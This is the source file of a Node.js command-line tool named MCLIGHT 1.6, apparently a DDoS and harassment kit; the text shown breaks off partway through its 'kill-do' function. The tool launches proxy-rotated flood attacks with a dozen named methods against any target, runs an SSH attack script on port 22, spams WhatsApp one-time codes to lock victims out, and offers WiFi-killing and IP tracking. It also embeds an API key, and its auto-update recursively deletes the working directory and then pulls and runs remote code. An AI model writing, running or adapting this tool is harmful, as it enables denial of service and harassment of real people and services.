#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '1.6'
let processList = [];

const raw_proxy_sites = [
  "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks5.txt",
  "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks4.txt",
  "https://raw.githubusercontent.com/zloi-user/hideip.me/main/https.txt",
  "https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt",
  "https://raw.githubusercontent.com/zloi-user/hideip.me/main/connect.txt",
  "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/all.txt",
  "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks5.txt",
  "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt",
  "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/proxy.txt",
  "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt",
  "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
  "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
  "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
  "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
  "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
  "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
  "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
  "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
  "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"
];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`


	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡏
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡟⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡟⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠁⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⣀
	⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⠟   
	⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀   https://e-z.bio/indonesia · windy
	⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀   MCLIGHT - 1.6
	⠘⠛⠛⠛⠛⠛⠛⠛⠛⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⢠⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⢠⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⢀⣾⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⣼⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


[=========================================]`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://gitlab.com/windyyid-group/mclight/-/raw/main/proxy.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`[X] Error fetching data: ${error.message}`);
  }
}

async function scrapeSocks5Proxy() {
  try {
    const response = await fetch('https://gitlab.com/windyyid-group/mclight/-/raw/main/socks5.txt');
    const data = await response.text();
    fs.writeFileSync('socks5.txt', data, 'utf-8');
  } catch (error) {
    console.error(`[X] Error fetching SOCKS5 proxies: ${error.message}`);
  }
}

// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gitlab.com/windyyid-group/mclight/-/raw/main/useragents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`[X] Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`‣ ▓░░░░░░░░░ » 10%`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent socks`);
    console.log(`‣ ▓▓░░░░░░░░ » 20%`);
    const getLatestVersion = await fetch('https://gitlab.com/windyyid-group/mclight/-/raw/main/version.txt');
    const latestVersion = await getLatestVersion.text()
    console.log(`‣ ▓▓▓░░░░░░░ » 30%`);
    if (version === latestVersion.trim()) {
    console.log(`‣ ▓▓▓▓▓▓░░░░ » 60%`);
    
    const secretBangetJir = await fetch('https://gitlab.com/windyyid-group/mclight/-/raw/main/pass.txt');
    const password = await secretBangetJir.text();
    await console.log(`[!] Login Key Required`)
    permen.question('[\x1b[1m\x1b[31mSONAR\x1b[0m] » \n', async (skibidi) => {
      if (skibidi === password.trim()) {
        console.log(`[!] Successfuly Logged`)
        await scrapeProxy()
        console.log(`‣ ▓▓▓▓▓▓▓░░░ » 70%`)
        await scrapeSocks5Proxy()
        console.log(`‣ ▓▓▓▓▓▓▓▓░░ » 80%`)
        await scrapeUserAgent()
        console.log(`[+] Scraping additional proxies from multiple sources...`)
        const additionalProxies = await scrapeAllProxies()
        console.log(`[+] Successfully added ${additionalProxies} additional proxies from ${raw_proxy_sites.length} sources`)
        console.log(`‣ ▓▓▓▓▓▓▓▓▓▓ » 100%`)
        await sleep(700)
        console.clear()
        console.log(`[!] Welcome To MCLIGHT Tools ${version}`)
        await sleep(1000)
		    await banner()
        console.log('» Type "help" For Showing All Available Command')
        sigma()
      } else {
        console.log(`[X] Wrong Key`)
        process.exit(-1);
      }
    }) 
  } else {
      console.log(`[!] This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
      console.log(`[!] Auto Updating...`)
      
      // Delete current directory contents
      console.log(`[+] Cleaning old files...`)
      fs.rmSync(process.cwd(), { recursive: true, force: true });
      
      // Clone latest version
      console.log(`[+] Downloading latest version...`)
      await exec(`git clone https://github.com/windyyid/mclight.git .`);
      
      // Install dependencies
      console.log(`[+] Installing dependencies...`)
      await exec(`npm install`);
      
      console.log(`[+] Update completed! Please restart the tool.`)
      process.exit()
    }
  } catch (error) {
    console.log(`[X] Please Check Your Internet Connection`)
  }
}
// [========================================] //
async function killWifi() {
const wifiPath = path.join(__dirname, `/lib/cache/StarsXWiFi`);
const startKillwiFi = spawn('node', [wifiPath]);
console.log(`
WiFi Killer Has Started
Type exit To Stop
`);
permen.question('[\x1b[1m\x1b[31mMCLIGHT Wifi Killer\x1b[0m] » \n', async (yakin) => {
if (yakin === 'exit') {
  startKillwiFi.kill('SIGKILL')
  console.log(`WiFi Killer Has Ended`)
  sigma()
} else {
  console.log(`[?] Do You Mean 'exit'?`)
  sigma()
}})
}
// [========================================] //
async function trackIP(args) {
  if (args.length < 1) {
    console.log(`[?] Example: track-ip <ip address>
track-ip 1.1.1.1`);
    sigma();
	return
  }
const [target] = args
  if (target === '0.0.0.0') {
  console.log(`[X] Do Not Attack Yourself`)
	sigma()
  } else {
    try {
const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
const res = await fetch(`https://ipwho.is/${target}`);
const additionalInfo = await res.json();
const ipInfo = await response.json();

    console.clear()
    console.log(`


      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡏
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡟⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡟⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠁⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⣀
      ⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⠟   
      ⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀   https://e-z.bio/indonesia · windy
      ⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀   MCLIGHT - 1.6
      ⠘⠛⠛⠛⠛⠛⠛⠛⠛⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⢠⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⢠⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⢀⣾⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⣼⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    
    
	  Tracking IP Address Result 
                      
[=========================================]

 ╔ Flags » ${ipInfo.country_flag}
 ╠ Country » ${ipInfo.country_name}
 ╠ Capital » ${ipInfo.country_capital}
 ╠ City » ${ipInfo.city}
 ╠ ISP » ${ipInfo.isp}
 ╠ Organization » ${ipInfo.organization}
 ╠ lat » ${ipInfo.latitude}
 ╠ long » ${ipInfo.longitude}     
 ╚ Google Maps » https://www.google.com/maps/place/${additionalInfo.latitude}+${additionalInfo.longitude}
`)
    sigma()
  } catch (error) {
      console.log(`[X] Error Tracking ${target}`)
      sigma()
    }
    }
};
// [========================================] //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function ongoingAttack() {
  console.log("\n[!] Ongoing Attack »\n");
  processList.forEach((process) => {
console.log(`╔ Target » ${process.target}
╠ Methods » ${process.methods}
╠ Duration » ${process.duration} Seconds
╚ Since » ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`[?] Example: attack <target> <duration> <methods>
attack https://google.com 120 flood`);
    sigma();
	return
  }
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`


	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡏
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡟⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡟⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠁⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⣀
	⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⠟   
	⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀   https://e-z.bio/indonesia · windy
	⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀   MCLIGHT - 1.6
	⠘⠛⠛⠛⠛⠛⠛⠛⠛⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⢠⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⢠⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⢀⣾⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⣼⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


	Attack Has Been Launched
                      
[=========================================]

╔ Target   » ${target}
╠ Duration » ${duration}
╠ Methods  » ${methods}
╠ ISP      » ${result.isp}
╠ Ip       » ${result.query}
╚ AS       » ${result.as}
`)
} catch (error) {
  console.log(`[X] Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
  if (methods === 'flood') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'tls') {
    pushOngoing(target, methods, duration)
     exec(`node ${metode} ${target} ${duration} 100 10`)
    sigma()
    } else if (methods === 'strike') {
      pushOngoing(target, methods, duration)
       exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
      sigma()
      } else if (methods === 'kill') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10`)
        sigma()
        } else if (methods === 'bypass') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'raw') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
          } else if (methods === 'thunder') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'rape') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${duration} 10 proxy.txt 70 ${target}`)
          sigma()
          } else if (methods === 'storm') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'destroy') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'slim') {
       pushOngoing(target, methods, duration)
const destroy = path.join(__dirname, `/lib/cache/destroy`);
const storm = path.join(__dirname, `/lib/cache/storm`);
const rape = path.join(__dirname, `/lib/cache/rape`);
        exec(`node ${destroy} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${rape} ${duration} 1 proxy.txt 70 ${target}`)
          sigma()
          } else if (methods === 'ovh') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
async function killSSH(args) {
  if (args.length < 2) {
    console.log(`[?] Example: kill-ssh <target> <duration>
kill-ssh 123.456.789.10 120`);
    sigma();
	return
  }
const [target, duration] = args
try {
const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`


	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡏
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡟⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡟⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠁⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⣀
	⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⠟   
	⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀   https://e-z.bio/indonesia · windy
	⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀   MCLIGHT - 1.6
	⠘⠛⠛⠛⠛⠛⠛⠛⠛⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⢠⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⢠⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⢀⣾⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⣼⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


	SSH Killer Has Been Launched
                    
[=========================================]

╔ Target   » ${target}
╠ Duration » ${duration}
╠ ISP      » ${result.isp}
╠ Ip       » ${result.query}
╚ AS       » ${result.as}
`)
} catch (error) {
  console.log(`[X] Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/StarsXSSH`);
exec(`node ${metode} ${target} 22 root ${duration}`)
sigma()
};
// [========================================] //
async function killOTP(args) {
  if (args.length < 2) {
    console.log(`[?] Example: kill-otp <target> <duration>
kill-otp 628xxx 120`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.clear()
console.log(`


	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡏
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡟⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡟⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠁⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⣀
	⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⠟   
	⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀   https://e-z.bio/indonesia · windy
	⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀   MCLIGHT - 1.6
	⠘⠛⠛⠛⠛⠛⠛⠛⠛⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⢠⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⢠⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⢀⣾⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⣼⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


  OTP Killer Has Been Launched
                           
[=========================================]

╔ Target   » ${target}
╚ Duration » ${duration}

Spamming WhatsApp OTP That Can Annoy Someone Or Maybe Make Them Cannot Login`)
} catch (error) {
  console.log(`[X] Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/StarsXTemp`);
exec(`node ${metode} +${target} ${duration}`)
sigma()
};
// [========================================] //
async function killDo(args) {
  if (args.length < 2) {
    console.log(`[?] Example: kill-do <target> <duration>
kill-do 123.456.78.910 300`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.clear()
console.log(`


	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡏
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡟⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡟⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠁⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⣀
	⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⠟   
	⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀   https://e-z.bio/indonesia · windy
	⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀   MCLIGHT - 1.6
